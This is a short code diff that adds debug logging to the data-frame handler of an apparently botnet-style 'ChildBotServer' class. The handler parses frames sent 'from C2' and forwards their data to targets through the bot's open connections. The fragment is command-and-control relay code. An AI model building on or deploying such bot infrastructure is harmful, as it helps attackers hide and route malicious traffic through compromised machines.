@@ -458,11 +458,14 @@ class ChildBotServer:
     def handle_data_frame(self, command):
         """Xử lý DATA frame từ C2"""
         try:
+            print(f"🔍 Bot received DATA frame: {command[:100]}...")
             # Format: DATA:IP:PORT:TIMESTAMP:DATA
             parts = command.split(":", 4)
             if len(parts) >= 5:
                 connection_id = f"{parts[1]}:{parts[2]}:{parts[3]}"  # IP:PORT:TIMESTAMP
                 data = parts[4]
+                
+                print(f"📦 Parsed DATA: connection_id={connection_id}, data_len={len(data)}")
                 
                 if connection_id in self.active_connections:
                     # Forward data to target
@@ -472,6 +475,7 @@ class ChildBotServer:
                     print(f"📤 Forwarded {len(data)} bytes to target")
                 else:
                     print(f"⚠️  Connection {connection_id} not found for data forwarding")
+                    print(f"   Available connections: {list(self.active_connections.keys())}")
                     
         except Exception as e:
             print(f"❌ Error handling data frame: {e}")
